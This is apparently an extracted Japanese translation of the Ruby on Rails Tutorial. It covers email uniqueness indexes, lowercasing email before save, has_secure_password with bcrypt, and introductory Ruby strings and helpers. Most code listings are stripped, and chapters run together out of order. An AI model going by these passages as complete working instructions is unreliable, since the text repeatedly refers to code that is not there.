しかし、依然としてここには1つの問題が残っています。それは\emph{Active Recordはデータベースのレベルでは一意性を保証していない}という問題です。
具体的なシナリオを使ってその問題を説明します。
アリスはサンプルアプリケーションにユーザー登録します。メールアドレスはalice@wonderland.comです。
アリスは誤って “Submit” を素早く\emph{2回}クリックしてしまいます。そのためリクエストが2つ連続で送信されます。
次のようなことが順に発生します。リクエスト1は、検証にパスするユーザーをメモリー上に作成します。リクエスト2でも同じことが起きます。リクエスト1のユーザーが保存され、リクエスト2のユーザーも保存されます。
この結果、一意性の検証が行われているにもかかわらず、同じメールアドレスを持つ2つのユーザーレコードが作成されてしまいます。
上のシナリオが信じがたいもののように思えるかもしれませんが、どうか信じてください。RailsのWebサイトでは、トラフィックが多いときにこのような問題が発生する可能性があるのです (筆者もこれを理解するのに苦労しました)。
幸い、解決策の実装は簡単です。実は、この問題はデータベースレベルでも一意性を強制するだけで解決します。
データベースのインデックス
データベースにカラムを作成するとき、そのカラムでレコードを\emph{検索する (find) }必要があるかどうかを考えることは重要です。
たとえば、リスト\ref{code:users_migration}のマイグレーションによって作成された \texttt{email}属性について考えてみましょう。
第\ref{cha:sign_up}章ではユーザーをサンプルアプリにログインできるようにしますが、このとき、送信されたものと一致するメールアドレスのユーザーのレコードをデータベースの中から探しだす必要があります。
これは、データベースの世界では\emph{全表スキャン}として知られており、数千のユーザーがいる実際のサイトでは\href{http://catb.org/jargon/html/B/Bad-Thing.html}{極めて不都合}です。
emailカラムにインデックスを追加することで、この問題を解決することができます。
データベースのインデックスを理解するためには、本の索引との類似性を考えるとよいでしょう。
索引のない本では、与えられた言葉 (例えば、“foobar”) が出てくる箇所をすべて見つけるためには、ページを端から順にめくって最後まで探す必要があります (紙バージョンの全表スキャン)。
しかし索引のある本であれば、“foobar”を含むすべてのページを索引の中から探すだけで済みます。
データベースのインデックスも本質的には本の索引と同じように動作します。
emailインデックスを追加すると、データモデリングの変更が必要になります。Railsでは (\ref{sec:database_migrations}で見たように) マイグレーションでインデックスを追加します。
\ref{sec:database_migrations}で、Userモデルを生成すると自動的に新しいマイグレーションが作成されたことを思い出してください (リスト\ref{code:users_migration})。今回の場合は、既に存在するモデルに構造を追加するので、以下のように\kode{migration}ジェネレーターを使用してマイグレーションを直接作成する必要があります。
ユーザー用のマイグレーションと異なり、メールアドレスの一意性のマイグレーションは未定義になっています。リスト\ref{code:email_uniqueness_index}のように定義を記述する必要があります
もちろん、リスト\ref{code:users_migration}の\kode{users}テーブル用のマイグレーションファイルを単に編集することも可能なのですが、その場合ロールバックが必要となり、マイグレーションが戻ってしまいます。
データモデルの変更が必要になったらその都度マイグレーションを行うのがRails流です。
メールアドレスの一意性を強制するためのマイグレーション
上のコードでは、\kode{users}テーブルの\kode{email}カラムにインデックスを追加するために\kode{add\_index}というRailsのメソッドを使っています。
インデックス自体は一意性を強制しませんが、オプションで\kode{unique: true}を指定することで強制できるようになります。
最後に、データベースをマイグレートします。
(上のコマンドが失敗した場合は、実行中のサンドボックスのコンソールセッションを終了してみてください。そのセッションがデータベースをロックしてマイグレーションを妨げている可能性があります)。
リスト\ref{code:generate_user_model}でユーザー用のfixtureが自動的に生成されていますが、メールアドレスが一意になっていません (リスト\ref{code:default_fixtures})。
(このデータはいずれも\emph{有効では}ありませんが、fixture内のサンプルデータはバリデーションを通っていなかったので今まで問題にはなりませんでした。)
Userのデフォルトfixture 
また、このfixtureは第\ref{cha:log_in_log_out}章になるまで使わない予定なので、今のところはこれらのデータを削除しておき、ユーザー用のfixtureファイルを空にしておきましょう (リスト\ref{code:empty_fixtures})。
空のfixtureファイル
一意性を強制すると何が起きるかについて関心のある方は、\kode{db/schema.rb}を開いてみると以下のような行があるはずです。
これで1つの問題が解決されましたが、メールアドレスの一意性を保証するためには、もう1つやらなければならないことがあります。
それは、いくつかのデータベースのアダプタが、常に大文字小文字を区別するインデックス (“Foo@ExAMPle.Comを使っているとは限らない問題への対処です。
この問題を避けるために、今回は「データベースに保存される直前にすべての文字列を小文字に変換する」という対策を採ります。例えば“Foo@ExAMPle.CoM”という文字列が与えられたら、保存する直前に“foo@example.com”に変換してしまいます。
これを実装するためにActive Recordの\href{http://en.wikipedia.org/wiki/Callback_(computer_science)}{\emph{callback}}メソッドを利用します。このメソッドは、ある特定の時点で呼び出されるメソッドです。
今回の場合は、オブジェクトが保存される時点で処理を実行したいので、\kode{before\_save}というコールバックを使います。これを使って、ユーザーをデータベースに保存する前にemail属性を強制的に小文字に変換します
他にどんなコールバックがあるのか知りたい場合は、\href{http://api.rubyonrails.org/v4.2.2/classes/ActiveRecord/Callbacks.html}{Rails APIのコールバック} (英語) を読んでみてください。
作成したコードをリスト\ref{code:email_downcase}に示します
(本チュートリアルで初めて紹介したテクニックですが、このテクニックについては第\ref{sec:account_activations_resource}章でもう一度取り上げます。そこではコールバックを定義するときに\emph{メソッドを参照する}という慣習について説明します。)
email属性を小文字に変換してメールアドレスの一意性を保証する 
リスト\ref{code:email_downcase}のコードは、\kode{before\_save}コールバックにブロックを渡してユーザーのメールアドレスを設定します。設定されるメールアドレスは、現在の値をStringクラスの\kode{downcase}メソッドを使って小文字バージョンにしたものです。
メールアドレスの小文字変換に対するテストは演習として残しておきます (\ref{sec:modeling_users_exercises})。
リスト\ref{code:email_downcase}では、次のように代入をしていましたが、
Userモデルの中では、右式で\kode{self}というキーワードは省略できます (ちなみにここの\kode{self}は現在のユーザーを指します)。したがって、次のように書くこともできます。
実は\ref{sec:a_class_of_our_own}の \kode{palindrome}内で\kode{reverse} メソッドを使っていたときも、同様のケースであったことを思い出してください。そのときと同様で、左式では\kode{self} を省略することは\emph{できません}。したがって、
と書くとうまく動きません。
(このトピックについては、\ref{sec:remember_me}でより深く解説していきます。)
これで、先に述べたアリスのシナリオはうまくいくようになります。データベースは、最初のリクエストに基づいてユーザーのレコードを保存しますが、2度目の保存は一意性の制約に反するので拒否します
(Railsのログにエラーが出力されますが、害は生じません)。
ユーザー属性の「名前」と「メールアドレス」に対してバリデーションを追加したので、最後の砦である「セキュアなパスワード」に取り掛かります。
セキュアパスワードという手法では、各ユーザーにパスワードとパスワードの確認を入力させ、それを (そのままではなく) \emph{ハッシュ化}したものをデータベースに保存します。
(ハッシュ化というと少し困惑してしまうかもしれません。
\ref{sec:hashes_and_symbols}では\emph{ハッシュ}とはRubyのデータ構造であると説明しましたが、今回の「ハッシュ化」とはそういった構造ではなく、\href{http://en.wikipedia.org/wiki/Hash_function}{ハッシュ関数}を使って入力されたデータを元に戻せない (不可逆な) データにする処理を指します。)
また、入力されたパスワードを使用してユーザーを\emph{認証}する手段と、第\ref{cha:log_in_log_out}章で使用する、ユーザーがサイトにログインできるようにする手段も提供します。
ユーザーの認証は、パスワードの送信、ハッシュ化、データベース内のハッシュ化された値との比較、という手順で進んでいきます。
比較の結果が一致すれば、送信されたパスワードは正しいと認識され、そのユーザーは認証されます。
ここで、生のパスワードではなく、ハッシュ化されたパスワード同士を比較していることに注目してください。こうすることで、生のパスワードをデータベースに保存するという危険なことをしなくてもユーザーを認証できます。
これで、仮にデータベースの内容が盗まれたり覗き見されるようなことがあっても、パスワードの安全性が保たれます。
<n><n>    \subsection{ハッシュ化されたパスワード} % (fold)<n>    \label{sec:a_hashed_password}<n><n>
セキュアなパスワードの実装は、\kode{has\_secure\_password}というRailsのメソッドを呼び出すだけでほとんど終わってしまいます。このメソッドは、Userモデルで次のように呼び出せます。
上のようにモデルにこのメソッドを追加すると、次のような機能が使えるようになります。
セキュアにハッシュ化したパスワードを、データベース内の\kode{password\_digest}という属性に保存できるようになる。
ここでいう「\emph{仮想的 (Virtual)}」とは、Userモデルのオブジェクトからは存在しているように見えるが、データベースには対応するカラムが存在しない、という意味です。
\kode{authenticate}メソッドが使えるようになる (引数の文字列がパスワードと一致するとUserオブジェクトを、間違っていると\kode{false}返すメソッド)<n>。
この魔術的な\kode{has\_secure\_password}機能を使えるようにするには、1つだけ条件があります。それは、モデル内に\kode{password\_digest}という属性が含まれていることです。
ちなみに\emph{digest}という言葉は、\href{http://en.wikipedia.org/wiki/Cryptographic_hash_function}{暗号化用ハッシュ関数}という用語が語源です。
したがって、今回の用途では\emph{ハッシュ化されたパスワード}と\emph{暗号化されたパスワード}は類義語となります。
ハッシュ化されたパスワードは、\emph{暗号化されたパスワード}とよく誤解されがちです。
たとえば、(実は本書の第1版や第2版でも間違っていたのですが) \href{https://github.com/rails/rails/blob/master/activemodel/lib/active_model/secure_password.rb}{has\_secure\_password}の\kode{ソースコード}でもこの手の間違いがあります。
というのも、専門用語としての「暗号」というのは、設計上\emph{元に戻す}ことができることを指します (暗号化できるという文には、\emph{復号もできる}というニュアンスが含まれます)。
一方、「パスワードのハッシュ化」では\emph{元に戻せない (不可逆)} という点が重要になります。したがって、 「計算量的に元のパスワードを復元するのは困難である」という点を強調するために、暗号化ではなくハッシュ化という用語を使っています。
(この間違った用語について指摘してくれたAndy Philipsに感謝します。)
今回はUserモデルで使うので、Userのデータモデルは以下の図のようになります (図\ref{fig:user_model_password_digest})。
Userモデルに\kode{password\_digest}属性を追加する
図\ref{fig:user_model_password_digest}のようなデータモデルにするために、まずは\kode{password\_digest}カラム用の適切なマイグレーションを生成します。
\kode{add\_password\_digest\_to\_users}というマイグレーションファイルを生成するためには、以下のコマンドを実行します。
上のコマンドでは\kode{password\_digest:string}という引数を与えて、今回必要になる属性名と型情報を渡しています。
上のCucumberのコマンドを、下のRSpecのコマンドと比較してみてください。
置き換えた結果をリスト\ref{code:password_migration}に示します。
\kode{users}テーブルに\kode{password\_digest}カラムを追加するマイグレーション
リスト\ref{code:password_migration}では、\kode{add\_column}メソッドを使って\kode{users}テーブル\kode{password\_digest}カラムを追加しています。
これを適用させるには、データベースでマイグレーションを実行します。
また、\kode{has\_secure\_password}を使ってパスワードをハッシュ化するためには、最先端のハッシュ関数である\href{http://en.wikipedia.org/wiki/Bcrypt}{bcrypt}が必要になります。
パスワードを適切にハッシュ化することで、たとえ攻撃者によってデータベースからパスワードが漏れてしまった場合でも、Webサイトにログインされないようにできます。
次に、いつものように\kode{bundle install}を実行します。
<n>\end{code}<n><n>    \subsection{ユーザーがセキュアなパスワードを持っている} % (fold)<n>    \label{sec:has_secure_password}<n><n>
Userモデルに\kode{password\_digest}属性を追加し、Gemfileにbcryptを追加したことで、ようやくUserモデル内で\kode{has\_secure\_password}が使えるようになりました (リスト\ref{code:has_secure_password})。
Userモデルに\kode{has\_secure\_password}を追加する ( \failing )
テストが失敗する理由は、\ref{sec:a_hashed_password}で触れたように\kode{has\_secure\_password}には、仮想的な\kode{password}属性と\kode{password\_confirmation}属性に対してバリデーションをする機能も(強制的に)追加されているからです。しかしリスト\ref{code:validates_uniqueness_of_email_case_insensitive_test}のテストでは、\kode{@user} 変数にこのような値がセットされておりません。
テストをパスさせるために、リスト\ref{code:test_with_password_confirmation}のようにパスワードとパスワード確認の値を追加します。
パスワードとパスワード確認を追加する ( \passing )
Userモデルに対して\kode{has\_secure\_password}を追加する利点は\ref{sec:creating_and_authenticating_a_user}で少しだけ説明しますが、 その前に、パスワードの最小文字数を設定する方法について説明します。
パスワードを簡単に当てられないようにするために、パスワードの最小文字数を設定しておくことは一般に実用的です。
\href{http://lmgtfy.com/?q=rails+enforce+password+strength}{Railsでパスワードの長さを設定する方法}はたくさんありますが、今回は簡潔にパスワードが空でないことと最小文字数 (6文字) の2つを設定しましょう。
パスワードの長さが6文字以上であることを検証するテストを、以下のLリスト\ref{code:minimum_password_length_test}に示します。
パスワードの最小文字数をテストする ( \failing )
ここで、以下のような多重代入 (Multiple Assignment) を使っていることに注目してください。
これはリスト\ref{code:minimum_password_length_test}で使用されていました。
パスワードとパスワード確認に対して同時に代入をしています (このケースでは、リスト\ref{code:length_validation_test}と同じように、文字列の乗算を利用して5文字の文字列を代入しています)。
リスト\ref{code:length_validation}では\kode{maximum}を使ってユーザー名の最大文字数を制限していましたが、これと似たような形式の\kode{minimum}というオプションを使って、最小文字数のバリデーションを実装することができます。
また、空のパスワードを入力させないために、\kode{存在性}のバリデーション (\ref{sec:presence_validation}) も一緒に追加します。結果として、Userモデルのコードはリスト\ref{code:password_implementation}のようになります。
セキュアパスワードの完全な実装 ( \passing )
 (end)<n><n>    \subsection{ユーザーの作成と認証} % (fold)<n>    \label{sec:creating_and_authenticating_a_user}<n><n>
以上でUserモデルの基本部分が完了しましたので、今度は\ref{sec:showing_users}でユーザー情報表示ページを作成するときに備えて、データベースに新規ユーザーを1人作成しましょう。
ただしWebからのユーザー登録はまだできない (第\ref{cha:sign_up}章で完成させます) ので、今回はRailsコンソールを使ってユーザーを手動で作成することにしましょう。
\ref{sec:creating_user_objects}で説明した\kode{create}を使いますが、後々実際のユーザーを作成する必要が出てくるので、今回はサンドボックス環境は\emph{使いません}。したがって、今回作成したユーザーを保存すると、データベースに反映されます。
それでは、まず\kode{rails console}コマンドを実行してセッションを開始し、次に有効な名前・メールアドレス・パスワード・パスワード確認を渡してユーザーを作成してみましょう。
もしうまくいかなくても、いつでもデータベースの中身をリセットできるので安心してください。リセットしたい場合は、以下の手順を踏んでください。
まずはコンソールから脱出してください (Ctrl-C)
(第\ref{cha:sign_up}章でもっと便利なメソッドを紹介します)
再度Railsコンソールを開き、コンソール上での作業をもう一度やり直してみてください
このとき、先ほど定義したUserモデルの属性 (図\ref{fig:user_model_password_digest}) に対応したカラムがあることにも注目しておいてください
SQLiteデータベース\kode{db/development.sqlite3}に登録されたユーザーの行
コンソールに戻って\kode{password\_digest}属性を参照してみると、リスト\ref{code:password_implementation}の\kode{has\_secure\_password}の効果を確認できます。
これは、Userオブジェクトを作成したときに、\kode{"foobar"}という文字列がハッシュ化された結果です。
bcryptを使って生成されているので、この文字列から元々のパスワードを導出することは、コンピュータを使っても非現実的です
設計上、bcryptアルゴリズムではハッシュ化する前に\href{https://en.wikipedia.org/wiki/Salt_(cryptography)}{ソルト}を追加しています。これにより、\href{https://en.wikipedia.org/wiki/Dictionary_attack}{辞書攻撃 (Dictionary Attacks)} や\href{https://en.wikipedia.org/wiki/Rainbow_table}{レインボーテーブル攻撃 (Rainbow Table Attacks)} といったタイプの攻撃を防ぐことができます。
また\ref{sec:a_hashed_password}で説明したように、\kode{has\_secure\_password}をUserモデルに追加したことで、そのオブジェクト内で\kode{authenticate}メソッドが使えるようになっています。
このメソッドは、引数に与えられた文字列 (パスワード) をハッシュ化した値と、データベース内にある\kode{password\_digest}カラムの値を比較します。
試しに、先ほど作成したuserオブジェクトに対して間違ったパスワードを与えてみましょう。
間違ったパスワードを与えた結果、\kode{user.authenticate}が\kode{false}を返したことがわかります。
次に、正しいパスワードを与えてみましょう。今度は\kode{authenticate}がそのユーザーオブジェクトを返すようになります。
第\ref{cha:log_in_log_out},章では、この\kode{authenticate}メソッドを使ってログインする方法を解説します。
なお、\kode{authenticate}がUserオブジェクトを返すことは重要ではなく、返ってきた値の論理値が\kode{true}であることが重要です。
Userオブジェクトは\kode{nil}でも\kode{false}でもないので、いい感じに仕事をしてくれています
\ref{sec:objects_and_message_passing}で、\kode{!!} という式が対応する論理値オブジェクト (!!nil => false) に変換されていたことを思い出してください。
この章では、ゼロからUserモデルを作成し、そこにname属性やemail属性、パスワード属性を加えました。また、それぞれの値を制限する多くの重要なバリデーションも追加しました。
さらに、与えられたパスワードをセキュアに認証できる機能も実装しました。
たった12行でここまでの機能が実装できたことは、(Railsの) 注目に値する点でもあります。
次の第\ref{cha:sign_up}章では、ユーザーを作成するためのユーザー登録フォームを作成し、各ユーザーの情報を表示するためのページも作成します。
第\ref{cha:log_in_log_out}章では、\ref{sec:adding_a_secure_password}の認証システムを利用して、ユーザーが実際にWebサイトにログインできるようにします。
Gitを使用している方は、しばらくコミットしていなかったのであれば、この時点でコミットしておくのがよいでしょう。
次にmasterブランチにマージして、リモートにあるリポジトリに対してpushします。
なお、本番環境でUserモデルを使うためには、\kode{heroku run}コマンドを使ってHeroku上でもマイグレーションを走らせる必要があります。
$ bundle exec rake test<n>$ git push heroku
うまくできたかどうかは、本番環境のコンソールに接続することで確認できます。
マイグレーションを使うことで、アプリケーションのデータモデルを修正することができる
Active Recordを使うと、データモデルを作成したり操作したりするための多数のメソッドが使えるようになる
Active Recordのバリデーションを使うと、モデルに対して制限を追加することができる
よくあるバリデーションには、存在性・長さ・フォーマットなどがある
正規表現は謎めいて見えるが非常に強力である
データベースにインデックスを追加することで検索効率が向上する。また、データベースレベルでの一意性を保証するためにも使われる
リスト\ref{code:email_downcase}の、メールアドレスを小文字に変換するコードに対するテストを、リスト\ref{code:email_downcase_test}に示されているように作成してください。
このテストでは、\kode{reload}メソッドを使用してデータベースから値を再度読み込み、\kode{assert\_equal}メソッドを使用して同値であるかどうかをテストしてください。
\kode{before\_save}コールバック内で\kode{email.downcase!}と書き、\kode{email}属性を直接変更してもよいことを、テストスイートを走らせて確認してください (リスト\ref{code:downcase_bang}のように書いてもよいことを、テストスイートを実行して確認してください。
\ref{sec:format_validation}で説明したように、 リスト\ref{code:validates_format_of_email}のメールアドレスチェックする正規表現は、“\emph{foo@bar..com”}のようにドットが連続した無効なメールアドレスを許容してしまいます。
このメールアドレスをリスト\ref{code:email_format_validation_tests}の無効なメールアドレスリストに追加し、これによってテストが失敗することを確認してください。次に、リスト\ref{code:better_email_regex}に示したもう少し複雑な正規表現を使用して、このテストがパスするようにしてください。
リスト\ref{code:email_downcase}のメールアドレス小文字変換をテストする
\kode{before\_save}コールバックの別の実装 
有効なメールアドレスかどうか (ドットが２つ以上連続するかどうか) を検証する正規表現 
\chapter{Rails風味のRuby} % (fold)<n>
\label{cha:rails_flavored_ruby}
この章では、第\ref{cha:static_pages}章で使用した例を基に、Railsにおいて重要となるRubyのさまざまな要素について探っていくことにしましょう。
Rubyは巨大な仕様を持つ言語ですが、幸い、Rails開発者にとって必要な知識は比較的少なくて済みます。
また、一般のRuby入門書で扱っている内容とも多少異なっています。
この章の目的は、「Rails風味のRuby」というものについての確固たる基盤を、皆さんのこれまでの言語経験に関わらず提供することです。
この章には多くの話題が盛り込まれていますが、一度読んだだけで理解する必要はまったくありません。
今後もこの章には頻繁に立ち戻って参照します。
<n><n>  \section{動機} % (fold)<n>  \label{sec:motivation}<n><n>
前章でお見せしたとおり、Rubyの基礎知識がまったくない状態であったにもかかわらずRailsアプリケーションの骨組みを作り上げ、さらにテストまで行うことができました。
このときは、本書が提供するテストコードと、テストスイートがパスするまでエラーメッセージの修正を繰り返すという方法だけを頼りに作業を進めました。
しかしこのような初歩的な作業をいつまでも続けるわけにはいきませんので、今の私たちのRubyに関する知識と経験の限界に真正面から挑み、これを乗り越えるためにこの章を割り当てることにします。
前章の終わりでは、Railsのレイアウトを使用してビューでの重複を取り除くために、ほぼ静的なページを単に更新したにとどまりました (リスト\ref{code:application_layout_redux})。これは、リスト\ref{code:application_layout}と同じものです。
サンプルアプリケーションのレイアウト
リスト\ref{code:application_layout_redux}の以下の行にご注目ください。
ここでは、Railsの組み込み関数\kode{stylesheet\_link\_tag} (詳細は\href{http://api.rubyonrails.org/classes/ActionView/Helpers/AssetTagHelper.html#method-i-stylesheet_link_tag}{Rails API}を参照) を使用して、\kode{application.css}をすべての\href{http://www.w3.org/TR/CSS2/media.html}{メディアタイプ}にインクルードしています (メディアタイプには、コンピュータの画面や印刷画面なども含まれます)。
Rails開発経験者にとってこの行は実にシンプルですが、しかしここには少なくとも混乱を生じる可能性のあるRubyの概念が4つあります。Railsの組み込み関数、かっこを使わない関数呼び出し、シンボル、そしてハッシュです。
これらの概念についてはこの章ですべて説明します。
Railsのビューでは膨大な組み込み関数を使用することができますが、それに加えて新しい関数を作成することもできます。
この関数は\emph{ヘルパー}と呼ばれます。カスタムヘルパーを作成する方法を学ぶために、まずリスト\ref{code:application_layout_redux}のタイトル行の部分に注目しましょう。
上の行は、ページタイトルの定義に依存しています。この定義は、以下のようにビューで\kode{provide}を使用して行われています。
  This is the home page for the
  sample application.
このとき、もしタイトルをまったく与えていなければ、タイトルが空欄になってしまいます。
これを防ぐには、すべてのページで使用する\emph{基本タイトル}を定め、特定のページでは異なるタイトルに変更できるようなオプションを与えるのが常套手段です。
これは現在のレイアウトでも、\emph{ある点を除いて}達成されています。もしビューの1つから\kode{provide}呼び出しを削除すると、そのページ固有のタイトルの代わりに以下のタイトルが表示されます。
<n><n>%= lang:rhtml<n>\begin{code}
<n>  | Ruby on Rails Tutorial Sample App
基本タイトルとしてはこれで正しいのですが、先頭に余分な縦棒 \kode{|} が残ってしまっています。
ページタイトルが正しく表示されない問題を解決するために、\kode{full\_title}というヘルパーを作成することにします。
\kode{full\_title}ヘルパーは、ページタイトルが定義されていない場合は基本タイトル「Ruby on Rails Tutorial Sample App」を返し、定義されている場合は基本タイトルに縦棒と追加ページタイトルを追加して返します (リスト\ref{code:title_helper})
あるヘルパーが特定のコントローラでのみ使用するものであれば、それに対応するヘルパーファイルに置く必要があります。たとえばStaticPagesコントローラ用ヘルパーは、通常\kode{app/helpers/static\_pages\_helper.rb}になります。
今回の場合、\kode{full\_title}ヘルパーはサイトのすべてのページで使用することを前提にしていますが、Railsにはこのような場合のための特別なヘルパーファイル\kode{app/helpers/application\_helper.rb}があります。
\kode{full\_title}ヘルパーを定義する
 \\ \filepath{app/helpers/application\_helper.rb}}<n>%= lang:ruby<n>\begin{code}<n>module ApplicationHelper<n><n>  
# ページごとの完全なタイトルを返します。
base_title
ヘルパーを作成したので、これを使用してレイアウトをシンプルにすることができます。
置き換えた結果をリスト\ref{code:application_layout_full_title}に示します。
\kode{full\_title}ヘルパーを使ったWebサイトのレイアウト
このヘルパーを定義することで、Homeページにこれまで表示されていた余分な「Home」という単語を表示せず、基本タイトルのみを正しく表示することもできるようになります。
これを行うには、まずリスト\ref{code:home_base_title_spec}に示すように以前のテストコードを更新し、\kode{"Home"} という文字が表示されていないことを確認するテストを追加します。
 Homeページのタイトル確認用にテストを更新する 
ここでテストスイートを実行して、テストが失敗することを確認します。
$ bundle exec rake test<n>3 tests, 6 assertions, 1 failures, 0 errors, 0 skips
テストがパスするためには、リスト\ref{code:home_page_base_title}のようにHomeページのビューから\kode{provide} の行を削除する必要があります。
ページタイトルをカスタマイズせずに表示するHomeページ 
この時点で、テストはパスするはずです。
\emph{注意}: これまでは\kode{rake test}を実行した結果の一部 (成功結果や失敗結果など) も載せていましたが、紙幅の関係から、今後は実行結果を省略します。
Rails開発経験者にとっては、リスト\ref{code:title_helper}のコードはスタイルシートをインクルードするのと大差ない単純なものですが、ここにもRubyの重要な概念が\emph{多数}含まれています。モジュール、メソッド定義、任意のメソッド引数、コメント、ローカル変数の割り当て、論理値 (boolean)、制御フロー、文字列の結合、そして戻り値です。
これらの概念についても、この章ですべて説明します。
Ruby を学ぶためのツールとして、主に\emph{Railsコンソール}を使用することにします。これは\ref{sec:demo_user_has_many_microposts}でも登場した、Railsアプリケーションを対話的に操作するためのコマンドラインツールです。
コンソールはインタラクティブRuby (\kode{irb}) 上に構築されているため、Rubyの機能をすべて使うことができます
(\ref{sec:a_controller_class}でも説明しますが、コンソールからRails環境にアクセスすることもできます)。
クラウドIDEをご利用の場合は、オススメのirbの設定があります。
シンプルなテキストエディタ「\kode{nano}」を使って、ホームディレクトリに「 \kode{.irbrc}」ファイルを作ってみましょう (リスト\ref{code:irbrc})。
~/.irbrc
リスト\ref{code:irbrc}の設定を使用すると、irbのプロンプトがより簡潔な表示に置き換えられ、irbの邪魔な自動インデント機能がオフになります。
上の設定はあくまでオススメなので、リスト\ref{code:irbrc}を追加しなくても、以下のようにRailsコンソールを開始できます。
Loading development environment
デフォルトでは、コンソールは\emph{development (開発) 環境}という、Railsによって定義された3種類の環境のうちの1つで起動します (他の2つは\emph{test (テスト) 環境}と\emph{production (本番) 環境}です)。
この区別はこの章においては重要ではありませんが、\ref{sec:rails_environments}でこれらの環境について詳細に説明します。
Railsコンソールは素晴しい学習ツールであり、その中を自由に探索できます。コンソールの中で何をしようとも、何かを壊すことは (まず) ありえないので、ご安心ください。
Railsコンソールでは、スタックから抜けるにはCtrl-Cを押し、完全にコンソールを終了するにはCtrl-Dを押します。
以後この章を進めるにあたり、有用なリソースである\href{http://ruby-doc.org/}{Ruby API}を参照しながら学習することをぜひお勧めします。Ruby APIには高濃縮の情報が詰まっています (少々\emph{濃厚すぎる}とも言えます)。たとえば、Rubyの文字列の詳細を知りたい場合は、Ruby APIエントリの\kode{String}クラスを参照すればよいのです。
<n><n>    \subsection{コメント} % (fold)<n>    \label{sec:comments}<n><n>Ruby \emph{comments} start with the pound sign~\kode{\#} (also called the ``hash mark'' or (more poetically) the ``octothorpe'') and extend to the end of the line. 
Rubyはコメントの内容を実行することはありませんが、適切なコメントはそれを読む人間にとって (コードの作者にとっても) 非常に有用です。
以下のコードの場合、
最初の行が、その後に定義されている関数の目的を説明しているコメントです。
コメントをコンソール内で入力する人は普通いませんが、ここでは学習のためにあえて以下のようにコメントを追加してみましょう。
=> 59
この章のコードを (ファイルに保存するのでなく) Railsコンソールに入力したりコピペしたりするときであれば、コメントを省略してもかまいません。コメントをRailsコンソールに入力しても、コメントは常に無視されるので問題ありません。
<n><n>    % subsection subsection_name (end)<n><n>    \subsection{文字列} % (fold)<n>    \label{sec:strings}<n><n>
\emph{文字列 (string)} は、Webアプリケーションにおいておそらく最も重要なデータ構造です。これは、Webページというものが究極的にはサーバーからブラウザに送信された文字列にすぎないためです。
それでは、コンソールで文字列について調べてみましょう。
=> "foo"
ここで入力したものは\emph{文字列リテラル}と呼ばれ (面白いことに\emph{リテラル文字列}とも呼ばれます)、ダブルクォート\kode{"} で囲むことで作成できます。
このコンソールは、入力したそれぞれの行を評価した結果を表示しており、文字列リテラルの場合には文字列自身が表示されます。
\kode{+} 演算子を使用して、文字列を結合することもできます。
=> "foobar"
評価の結果は、\kode{"foo"} と \kode{"bar"} を足した\kode{"foobar"}になりました
より詳細な“foo”と“bar”の起源については、\emph{Jargon Fileの“foo”という記事} (英語) を参照してください。ちなみに"foobarと"FUBAR"には\href{http://www.catb.org/jargon/html/F/foo.html}{全く関係がありませんでした}。
=> "Michael"
苗字と名前の両方を変数に割り当てることもできます。
=> "Hartl"
最後の2つの結果は同等であることにご注目ください。なお、著者は後者の式展開の方が好みです。空白を\kode{" "}のように直接加えるのはどうもぎこちなく思えます。
文字列を\emph{出力}するために、Rubyの関数で最も一般に使われるのは\kode{puts}です (putの三人称単数現在形ではなく「put string」なので、「put ess」と発音します)。
=> nil
\kode{puts}メソッドでは\emph{副作用}が重要な役割を果たします。どういうことかと言うと、\kode{puts "foo"}は文字列「"foo"」を副作用としてスクリーンに表示しますが、返り値には「\href{http://www.answers.com/nil}{文字どおりの無}」である\kode{nil}を返します。nilは「何にもない」ことを表すRubyの特別な値です。
なお、\kode{=> nil} という結果は、簡素化のために今後省略することがあります。
\kode{print}メソッドも同様の出力を行いますが、以下のように、改行文字を追加しない点が異なります。
foo=> nil
シングルクォート内の文字列
これまでの例ではすべて\emph{ダブルクォート文字列}を使用していましたが、Rubyでは\emph{シングルクォート}もサポートしています。
ほとんどの場合、ダブルクォートとシングルクォートのどちらを使用しても実質的に同じです。
ただし、1つ重要な違いがあります。Rubyはシングルクォート文字列の中では式展開を行いません。
=> "\#{foo} bar"
ダブルクォート文字列でもシングルクォート文字列と同じことができ、ダブルクォート文字列では式展開もできるのであれば、シングルクォート文字列にはどのような使い道があるのでしょうか。
シングルクォートは、入力した文字をエスケープせずに「そのまま」保持するときに便利です。
シングルクォートで文字列を囲めば、簡単にバックスラッシュ文字のような特殊文字をそのまま変数に含めることができます。
このような些細な例の場合はそれほど問題になりませんが、以下のようにエスケープの必要な文字が大量にある場合には、シングルクォートは非常に便利です。
=> "Newlines (\\n) and tabs (\\t) both use the backslash character \\."
最後にもう一度申し上げます。ほとんどの場合、シングルクォートとダブルクォートのどちらを使おうと大きな違いはありません。実際、一般のソースコードでは、明確な理由もなく両者が混用されているケースをよく見かけます。
以上でRubyの文字列に関する説明は終わりです。あ、言い忘れていたことがありましたね。「Rubyの世界へようこそ!」
Rubyでは、あらゆるものが\kode{オブジェクト}です。文字列や\emph{nil}ですらオブジェクトです。
We’ll see the technical meaning of this in Section \ref{sec:a_class_of_our_own}, but I don’t think anyone ever understood objects by reading the definition in a book; you have to build up your intuition for objects by seeing lots of examples.
逆に、オブジェクトが何を\emph{する}かを説明するのは簡単です。オブジェクトとは (いついかなる場合にも) メッセージに応答するものです。
文字列のようなオブジェクトは、たとえば\kode{length}というメッセージに応答できますが、これは文字列の文字数を返します。
オブジェクトに渡されるメッセージは、一般には\emph{メソッド}と呼ばれます。メソッドの実体は、そのオブジェクトに定義された関数です
この章の全体にわたって、\emph{関数}という言葉と\emph{メソッド}という言葉が混在していることを前もってお詫びいたします。Rubyでは関数とメソッドには何の違いもありません。すべてのメソッドは関数であり、すべての関数はメソッドでもあります。それもこれも、あらゆるものがオブジェクトであるからです。
Rubyの文字列は、以下のように\kode{empty?}メソッドにも応答することができます。
\kode{empty?}メソッドの末尾にある疑問符にご注目ください。
Rubyでは、メソッドが\emph{true}または\emph{false}という\kode{論理値(boolean)}を返すことを末尾の疑問符で示す慣習があります。
論理値は、特に\emph{処理の流れを変更する}ときに有用です。
=> "The string is nonempty"
条件文を2つ以上含めたい場合は、\kode{elsif} (\kode{else} + \kode{if}) という文を使います。
Userモデルができあがったので、いよいよユーザー登録機能を追加しましょう。
\ref{sec:signup_form}ではHTML \emph{フォーム}を使用して登録情報をWebアプリケーションに送信します。続いて\ref{sec:successful_signups}ではユーザーを新規作成して情報をデータベースに保存します。
